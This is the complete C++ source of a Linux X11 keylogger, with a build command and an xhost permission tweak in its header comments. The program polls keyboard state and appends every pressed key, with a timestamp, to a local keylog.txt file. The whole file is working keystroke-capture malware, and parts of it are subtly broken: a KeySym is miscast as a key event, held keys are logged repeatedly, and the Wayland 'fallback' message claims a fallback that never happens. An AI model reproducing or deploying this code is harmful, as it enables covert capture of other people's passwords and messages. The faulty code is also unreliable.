// g++ keyLogger_linux.cpp -o keylogger -lX11 -lXtst
//?debug 
//?xhost +SI:localuser:$(whoami)

#include <X11/Xlib.h>
#include <X11/extensions/XTest.h>
#include <X11/keysym.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <unistd.h>

// Global log file
std::ofstream logFile;

// Function to get the current timestamp
std::string GetTimestamp() {
    std::time_t now = std::time(nullptr);
    char buf[100];
    strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S]", std::localtime(&now));
    return std::string(buf);
}

// Function to log key presses
void LogKeyPress(const std::string& key) {
    logFile << GetTimestamp() << " Key Pressed: " << key << std::endl;
    logFile.flush();
}

// Function to translate key codes to readable names
std::string GetKeyName(Display* display, KeySym keysym) {
    char buffer[32];
    XLookupString((XKeyEvent*)&keysym, buffer, sizeof(buffer), &keysym, nullptr);
    return std::string(buffer);
}

// Function to handle X11 keylogging
void StartX11Keylogger() {
    Display* display = XOpenDisplay(nullptr);
    if (!display) {
        std::cerr << "Failed to open X11 display. Ensure DISPLAY is set correctly." << std::endl;
        exit(1);
    }

    Window root = DefaultRootWindow(display);

    std::cout << "X11 Keylogger started. Press Ctrl+C to exit." << std::endl;

    // Infinite loop to capture key presses
    while (true) {
        char keys[32];
        XQueryKeymap(display, keys);

        for (int keycode = 0; keycode < 256; ++keycode) {
            if (keys[keycode / 8] & (1 << (keycode % 8))) {
                KeySym keysym = XKeycodeToKeysym(display, keycode, 0);
                std::string keyName = GetKeyName(display, keysym);

                if (!keyName.empty()) {
                    LogKeyPress(keyName);
                }
            }
        }

        usleep(10000); // Sleep for 10ms to reduce CPU usage
    }

    XCloseDisplay(display);
}

// Function to check if the system is running Wayland
bool IsWayland() {
    const char* waylandDisplay = getenv("WAYLAND_DISPLAY");
    return (waylandDisplay != nullptr);
}

int main() {
    // Open log file in append mode
    logFile.open("keylog.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    // Check if Wayland is in use
    if (IsWayland()) {
        std::cerr << "Wayland is not supported in this version. Falling back to XWayland if available." << std::endl;
        std::cerr << "For full Wayland support, you'll need to use system-specific methods (e.g., libinput)." << std::endl;
    } else {
        StartX11Keylogger();
    }

    logFile.close();
    return 0;
}
